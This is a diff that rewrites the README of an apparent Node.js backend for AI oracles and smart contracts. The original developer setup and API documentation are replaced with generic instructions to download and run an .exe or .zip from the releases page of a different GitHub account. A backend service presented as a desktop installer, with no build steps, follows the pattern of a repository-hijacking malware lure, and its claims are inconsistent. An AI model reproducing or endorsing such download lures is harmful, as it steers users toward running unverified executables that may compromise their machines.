@@ -1,239 +1,68 @@
-# 🚀 OpenPhron Backend
+# 🚀 openphron-backend - Simplifying Smart Contracts with AI
 
-> Where AI meets blockchain, and smart contracts get a conversational upgrade.
+## 🛠️ Download Now
+[![Download Now](https://img.shields.io/badge/Download%20Now-Release-blue.svg)](https://github.com/ramilafuinte/openphron-backend/releases)
 
-OpenPhron is a powerful backend platform that bridges the gap between AI oracles and smart contract creation. Think of it as your AI-powered assistant for building blockchain contracts, but with a marketplace twist where you can discover, subscribe to, and leverage various AI oracles.
+## ✨ Introduction
+OpenPhron is a powerful backend platform designed for everyone. It connects AI oracles to smart contract creation. You can think of it as your personal assistant for building blockchain contracts. In OpenPhron, you can discover and subscribe to various AI oracles while also creating your own contracts through simple conversations.
 
-## ✨ What's This All About?
+## 🚀 Getting Started
+Using OpenPhron is easy. Just follow these steps to get up and running quickly.
 
-Ever wished you could just *talk* to an AI and have it generate smart contracts for you? That's exactly what OpenPhron does. It's not just another blockchain tool—it's a complete ecosystem where:
+### 1. Visit the Releases Page
+To download OpenPhron, go to the [Releases page](https://github.com/ramilafuinte/openphron-backend/releases).
 
-- 🤖 **AI Oracles** live in a marketplace, ready to be discovered and subscribed to
-- 💬 **Conversational Contract Creation** lets you build smart contracts through natural language
-- 🔗 **Blockchain Integration** seamlessly connects with Arbitrum Sepolia
-- 🔑 **API Management** gives you full control over your integrations
-- 📊 **Token-Based Subscriptions** power the oracle economy
+### 2. Choose Your Version
+On the Releases page, you will see a list of available versions. Select the latest version for the best features and updates.
 
-## 🎯 Key Features
+### 3. Download the Application
+Click on the version you want. Then, look for the download link for your operating system. This will typically be an `.exe` file for Windows or a `.zip` file for other systems. 
 
-### AI Oracle Marketplace
-- Browse and discover AI oracles created by the community
-- Create your own custom oracles
-- Subscribe to oracles with token-based access
-- Manage questions and interactions with oracles
+### 4. Install OpenPhron
+After the download completes, locate the file on your computer. If it’s a `.zip` file, unzip it first. Then, run the installation file. Follow the prompts to complete the installation process.
 
-### Smart Contract Workflow
-- **Chat-based contract creation**: Start with an idea, refine through conversation
-- **AI-powered code generation**: Uses OpenAI and Google Gemini to generate contract code
-- **Workflow management**: Organize and track your contract development process
-- **Contract sharing**: Share your contracts publicly or with specific access tokens
-- **Deployment tracking**: Keep tabs on your deployed contracts
+### 5. Run OpenPhron
+Once the installation is complete, you can find OpenPhron in your applications folder. Click the icon to start using the software.
+
+## 📖 How to Use OpenPhron
+OpenPhron has several key features designed to enhance your experience.
+
+### AI Oracles
+Explore a marketplace of AI oracles. You can easily search for the ones that fit your needs. These oracles help generate smart contracts and offer unique functionalities.
+
+### Conversational Contract Creation
+Using natural language, you can create smart contracts without needing to know any programming skills. Just type your requirements in plain English, and OpenPhron will take care of the rest.
 
 ### Blockchain Integration
-- Real-time event listening from blockchain contracts
-- Oracle marketplace contract integration
-- Signature verification for secure transactions
-- Support for Arbitrum Sepolia network
+OpenPhron seamlessly connects to Arbitrum Sepolia, allowing you to execute your contracts on the blockchain with ease.
 
-### API & Access Control
-- API key generation and management
-- Token-based subscription system
-- Daily token limits and subscription periods
-- Admin controls for platform management
+### API Management
+Manage your API integrations directly within the platform. This feature gives you control over how you connect with other services.
 
-## 🛠️ Tech Stack
+### Token-Based Subscriptions
+OpenPhron operates on a token-based subscription model for the oracles. This system ensures you can access the resources you need without any hassle.
 
-Built with modern TypeScript and a solid architecture:
+## 📥 Download & Install
+For first-time users, here’s a step-by-step guide to download OpenPhron.
 
-- **Runtime**: Node.js with Express
-- **Language**: TypeScript (strict mode enabled)
-- **Database**: MongoDB with Mongoose
-- **Blockchain**: Ethers.js v5.7.2
-- **AI Integration**: 
-  - OpenAI API
-  - Google Gemini AI
-- **Other**: CORS, crypto-js, node-cron, UUID
+1. Click on the [Releases page](https://github.com/ramilafuinte/openphron-backend/releases).
+2. Choose the latest release to ensure you have all the latest features.
+3. Download the appropriate file for your system.
+4. Complete the installation by running the downloaded file.
+5. Open the application and start exploring.
 
-## 📦 Installation
+## 💡 Tips for Success
+- **System Requirements:** Make sure your device meets the minimum requirements. For optimal performance, use a recent version of Windows, macOS, or Linux.
+- **Join the Community:** Engage with other users in the community forum or chat groups to share tips and tricks.
+- **Read the Documentation:** Familiarize yourself with the user documentation available on the repository.
 
-Getting started is straightforward:
+## 🚧 Troubleshooting
+If you encounter issues, here are some common solutions:
 
-```bash
-# Clone the repository
-git clone https://github.com/idealbridgex/openphron-backend
+- **Installation Problems:** Ensure your operating system is updated. Check permissions if you're on a corporate network.
+- **Running the Application:** If OpenPhron does not open, try reinstalling or checking your system’s compatibility.
 
-# Navigate to the project
-cd openphron-backend
+## 💬 Feedback
+We value your feedback. If you have suggestions or encounter any issues, feel free to reach out through the repository’s issue tracker.
 
-# Install dependencies
-npm install
-```
-
-## ⚙️ Configuration
-
-Create a `.env` file in the root directory with the following variables:
-
-### Required Variables
-
-```env
-# Database
-DBNAME=your-db-name
-
-# AI Services
-GEMINI_KEY=your-gemini-api-key
-# Get your key at: https://ai.google.dev/gemini-api/docs/api-key
-
-# Blockchain
-RPC_URL=your-arbitrum-sepolia-rpc-url
-
-# Server
-PORT=9001
-
-# Token System
-TOKEN_LIMIT=your-daily-token-limit
-DAY_LIMIT=subscription-period-in-days
-
-# OpenPhron Integration
-OPENPHRON_UPDATEDATA_URL=your-update-data-url
-OPENPHRON_UPDATEFEEDS_URL=your-update-feeds-url
-```
-
-### Optional: Proxy Configuration
-
-If you need to use a proxy:
-
-```env
-PROXY_ENABLE=true
-PROXY_HOST=your-proxy-host
-PROXY_PASS=your-proxy-password
-PROXY_USER=your-proxy-username
-```
-
-## 🚦 Running the Application
-
-### Development Mode
-
-```bash
-npm run dev
-```
-
-This starts the server with `ts-node` for hot reloading during development.
-
-### Production Build
-
-```bash
-# Build TypeScript to JavaScript
-npm run build
-
-# Start the production server
-npm start
-```
-
-### Testing
-
-```bash
-npm test
-```
-
-## 📡 API Endpoints
-
-The API is organized into several main sections:
-
-### Contracts
-- `GET /api/contract` - Get user contracts
-- `POST /api/contract` - Create new contract (init message)
-- `POST /api/contract/message` - Send message to contract
-- `POST /api/contract/share` - Share a contract
-- `GET /api/contract/shared/:access_token` - Get shared contract
-- `POST /api/contract/deployed` - Add deployed contract
-- `GET /api/contract/deployed` - Get deployed contracts
-- `DELETE /api/contract/:_id` - Delete contract
-
-### Workflows
-- `GET /api/workflow` - Get user workflows
-- `GET /api/workflow/:id` - Get workflow by ID
-
-### Oracles
-- `GET /api/oracle` - List all oracles
-- `GET /api/oracle/:id` - Get oracle by ID
-- `POST /api/oracle` - Create new oracle
-- `POST /api/oracle/rename` - Rename oracle
-- `DELETE /api/oracle/:id` - Delete oracle
-
-### Questions
-- `GET /api/question` - List questions
-- `GET /api/question/:id` - Get question by ID
-- `GET /api/question/oracle/:oracleId` - Get questions for oracle
-- `POST /api/question` - Create question
-- `POST /api/question/update` - Update question
-
-### Subscriptions
-- `POST /api/subscribe` - Subscribe to oracle
-- `GET /api/subscription/user` - Get user subscriptions
-- `GET /api/subscription/oracle/:oracleId` - Get subscriptions for oracle
-
-### Tokens
-- `GET /api/token` - Get user tokens
-- `POST /api/token/reduce` - Reduce tokens
-- `POST /api/token/subscribe` - Subscribe tokens
-
-### API Keys
-- `GET /api/key` - Get API keys
-- `POST /api/key` - Create API key
-- `DELETE /api/key/:apiKey` - Delete API key
-
-### Admin
-- `/api/admin/*` - Admin routes (requires admin verification)
-
-## 🔐 Security
-
-- **Signature Verification**: Most endpoints require wallet signature verification via `verifySignatureMiddleware`
-- **Admin Protection**: Admin routes are protected with `verifyAdmin` middleware
-- **CORS**: Configured to allow cross-origin requests (adjust in production)
-
-## 🏗️ Project Structure
-
-```
-src/
-├── AImarketplace/      # AI Oracle marketplace logic
-│   ├── blockchain/     # Blockchain contract integration
-│   ├── controllers/    # Oracle, question, subscription controllers
-│   ├── models/         # Database models
-│   ├── service/        # Business logic
-│   └── utils/          # Event handling utilities
-├── api/                # API key management
-├── contract/           # Smart contract creation & workflow
-│   ├── config/         # Workflow and AI pattern configurations
-│   ├── controllers/    # Contract, workflow, cost controllers
-│   ├── data-access/    # Database access layer
-│   ├── models/         # Contract models
-│   ├── services/       # Contract generation services
-│   └── utils/          # AI integration (OpenAI, Gemini)
-├── admin/              # Admin functionality
-├── dbConnect/          # MongoDB connection
-├── middleware/         # Auth and verification middleware
-└── routers/            # Route definitions
-```
-
-## 🤝 Contributing
-
-Contributions are welcome! This project is licensed under the Apache License 2.0. Feel free to:
-
-1. Fork the repository
-2. Create a feature branch
-3. Make your changes
-4. Submit a pull request
-
-## 📄 License
-
-This project is licensed under the Apache License 2.0 - see the [LICENSE](LICENSE) file for details.
-
-## 🙏 Acknowledgments
-
-Built with ❤️ for the blockchain and AI community. Special thanks to all the open-source libraries that make this possible.
-
----
-
-**Note**: This is a backend service. You'll need a frontend application to interact with it, or use the API endpoints directly. Make sure to configure all environment variables before running the server.
-
-Questions? Issues? Feel free to open an issue on GitHub!
+For a smooth experience, remember to regularly check the [Releases page](https://github.com/ramilafuinte/openphron-backend/releases) for updates and new features. Enjoy using OpenPhron, your trusting partner in smart contract creation!
